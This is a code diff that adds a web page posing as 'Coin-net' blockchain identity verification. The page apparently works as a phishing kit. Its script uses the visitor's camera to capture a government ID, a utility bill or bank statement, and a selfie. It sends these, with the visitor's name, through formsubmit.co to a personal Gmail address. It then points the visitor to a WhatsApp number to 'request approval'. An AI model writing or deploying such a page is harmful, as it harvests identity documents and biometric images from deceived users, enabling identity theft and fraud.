@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verification</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: "Segoe UI", sans-serif;
+      background: #000;
+      color: #fff;
+    }
+    .step { display: none; flex-direction: column; gap: 14px; }
+    .step.active { display: flex; }
+    input, select {
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid #fff;
+      background: #000;
+      color: #fff;
+      font-size: 16px;
+    }
+    button {
+      padding: 14px;
+      background: #fff;
+      color: #000;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+    video {
+      width: 100%;
+      height: 400px;
+      border-radius: 12px;
+      border: 2px solid white;
+      object-fit: cover;
+      background: #000;
+    }
+    .success { text-align: center; }
+    .hidden { display: none; }
+    label { font-weight: 600; }
+  </style>
+</head>
+<body>
+
+<form action="https://formsubmit.co/coinnet50@gmail.com" method="POST" enctype="multipart/form-data" id="verifyForm">
+  <!-- Step 1 -->
+  <div class="step active" id="step1">
+    <label>Enter Full Name</label>
+    <input type="text" name="full_name" id="fullName" placeholder="Firstname Lastname" required />
+    <button type="button" onclick="goToStep2()">Next</button>
+  </div>
+
+  <!-- Step 2 -->
+  <div class="step" id="step2">
+    <label>Select Government Issued ID</label>
+    <select name="government_id_type" id="govID" required onchange="showGovCamera()">
+      <option value="">Choose...</option>
+      <option>Passport</option>
+      <option>Driver's License</option>
+      <option>ID Card</option>
+    </select>
+    <div id="govCameraBox" class="hidden">
+      <label>Capture Government ID</label>
+      <video id="camera" autoplay playsinline></video>
+      <button type="button" onclick="captureGovID()">Capture ID</button>
+    </div>
+  </div>
+
+  <!-- Step 3 -->
+  <div class="step" id="step3">
+    <label>Select Proof of Address</label>
+    <select name="proof_document_type" id="proofDoc" required onchange="showProofCamera()">
+      <option value="">Choose...</option>
+      <option>Utility Bill</option>
+      <option>Bank Statement</option>
+    </select>
+    <div id="proofCameraBox" class="hidden">
+      <label>Capture Proof Document</label>
+      <video id="camera2" autoplay playsinline></video>
+      <button type="button" onclick="captureProof()">Capture Proof</button>
+    </div>
+  </div>
+
+  <!-- Step 4 -->
+  <div class="step" id="step4">
+    <label>Take a Selfie</label>
+    <video id="camera3" autoplay playsinline></video>
+    <button type="button" onclick="captureSelfie()">Finish</button>
+  </div>
+
+  <!-- Step 5 -->
+  <div class="step" id="step5">
+    <div class="success">
+      <h2>Verification Complete</h2>
+      
+      <svg xmlns="http://www.w3.org/2000/svg" width="55" height="55" fill="currentColor" class="bi bi-patch-check" viewBox="0 0 16 16" style="color: #00980f;">
+  <path fill-rule="evenodd" d="M10.354 6.146a.5.5 0 0 1 0 .708l-3 3a.5.5 0 0 1-.708 0l-1.5-1.5a.5.5 0 1 1 .708-.708L7 8.793l2.646-2.647a.5.5 0 0 1 .708 0"/>
+  <path d="m10.273 2.513-.921-.944.715-.698.622.637.89-.011a2.89 2.89 0 0 1 2.924 2.924l-.01.89.636.622a2.89 2.89 0 0 1 0 4.134l-.637.622.011.89a2.89 2.89 0 0 1-2.924 2.924l-.89-.01-.622.636a2.89 2.89 0 0 1-4.134 0l-.622-.637-.89.011a2.89 2.89 0 0 1-2.924-2.924l.01-.89-.636-.622a2.89 2.89 0 0 1 0-4.134l.637-.622-.011-.89a2.89 2.89 0 0 1 2.924-2.924l.89.01.622-.636a2.89 2.89 0 0 1 4.134 0l-.715.698a1.89 1.89 0 0 0-2.704 0l-.92.944-1.32-.016a1.89 1.89 0 0 0-1.911 1.912l.016 1.318-.944.921a1.89 1.89 0 0 0 0 2.704l.944.92-.016 1.32a1.89 1.89 0 0 0 1.912 1.911l1.318-.016.921.944a1.89 1.89 0 0 0 2.704 0l.92-.944 1.32.016a1.89 1.89 0 0 0 1.911-1.912l-.016-1.318.944-.921a1.89 1.89 0 0 0 0-2.704l-.944-.92.016-1.32a1.89 1.89 0 0 0-1.912-1.911z"/>
+</svg>
+
+      <p>Please request approval from Coin-net, click the button below to get started.</p>
+      
+                       <input type="hidden" name="_next" value="https://wa.me/+6283837295534?text=I%20have%20just%20finished%20my%20verification%20and%20requesting%20approval.">
+      
+      <button type="submit">Request Approval</button>
+    </div>
+  </div>
+
+  <!-- Hidden File Inputs for Attachments -->
+  <input type="file" name="government_id_file" id="govIDFile" class="hidden" />
+  <input type="file" name="proof_document_file" id="proofFile" class="hidden" />
+  <input type="file" name="selfie_file" id="selfieFile" class="hidden" />
+
+  <!-- Required for FormSubmit -->
+  <input type="hidden" name="_captcha" value="false" />
+  <input type="hidden" name="_subject" value="New Verification Submission" />
+  <input type="hidden" name="_template" value="table" />
+  
+</form>
+
+<canvas id="canvas" class="hidden"></canvas>
+
+
+<!-- Footer Section -->
+<div style="
+  position: fixed;
+  bottom: 15px;
+  left: 0;
+  width: 100%;
+  text-align: center;
+  font-size: 13px;
+  color: #aaa;
+  font-family: 'Roboto', sans-serif;
+  pointer-events: none;
+  z-index: 999;
+">
+  © 2025 Official Blockchain — All rights reserved · Coin_net.com
+</div>
+
+<script>
+  const canvas = document.getElementById("canvas");
+  const govVideo = document.getElementById("camera");
+  const proofVideo = document.getElementById("camera2");
+  const selfieVideo = document.getElementById("camera3");
+
+  const govIDFile = document.getElementById("govIDFile");
+  const proofFile = document.getElementById("proofFile");
+  const selfieFile = document.getElementById("selfieFile");
+
+  let govStream, proofStream, selfieStream;
+
+  function showStep(stepId) {
+    ["step1", "step2", "step3", "step4", "step5"].forEach(id => {
+      document.getElementById(id).classList.remove("active");
+    });
+    document.getElementById(stepId).classList.add("active");
+  }
+
+  function goToStep2() {
+    const fullName = document.getElementById("fullName").value.trim();
+    const nameRegex = /^[A-Z][a-z]+\s[A-Z][a-z]+$/;
+    if (!nameRegex.test(fullName)) {
+      alert("Please enter a valid full name (e.g., King Tony)");
+      return;
+    }
+    showStep("step2");
+  }
+
+  function showGovCamera() {
+    document.getElementById("govCameraBox").classList.remove("hidden");
+    if (govStream) govStream.getTracks().forEach(track => track.stop());
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } } })
+      .then(stream => {
+        govStream = stream;
+        govVideo.srcObject = stream;
+        govVideo.play(); // 🔥 critical for live view
+      })
+      .catch(err => alert("Back camera error: " + err.message));
+  }
+
+  function captureGovID() {
+    captureToFile(govVideo, govIDFile, "gov-id.jpg");
+    if (govStream) govStream.getTracks().forEach(track => track.stop());
+    showStep("step3");
+  }
+
+  function showProofCamera() {
+    document.getElementById("proofCameraBox").classList.remove("hidden");
+    if (proofStream) proofStream.getTracks().forEach(track => track.stop());
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } } })
+      .then(stream => {
+        proofStream = stream;
+        proofVideo.srcObject = stream;
+        proofVideo.play(); // 🔥 critical for live view
+      })
+      .catch(err => alert("Back camera error: " + err.message));
+  }
+
+  function captureProof() {
+    captureToFile(proofVideo, proofFile, "proof.jpg");
+    if (proofStream) proofStream.getTracks().forEach(track => track.stop());
+    showStep("step4");
+    startSelfieCamera();
+  }
+
+  function startSelfieCamera() {
+    if (selfieStream) selfieStream.getTracks().forEach(track => track.stop());
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        selfieStream = stream;
+        selfieVideo.srcObject = stream;
+        selfieVideo.play(); // 🔥 critical for live view
+      })
+      .catch(err => alert("Front camera error: " + err.message));
+  }
+
+  function captureSelfie() {
+    captureToFile(selfieVideo, selfieFile, "selfie.jpg");
+    if (selfieStream) selfieStream.getTracks().forEach(track => track.stop());
+    showStep("step5");
+  }
+
+  function captureToFile(video, fileInput, filename) {
+    const ctx = canvas.getContext("2d");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+      const file = new File([blob], filename, { type: "image/jpeg" });
+      const dt = new DataTransfer();
+      dt.items.add(file);
+      fileInput.files = dt.files;
+    }, "image/jpeg", 0.95);
+  }
+</script>
+</body>
+</html>
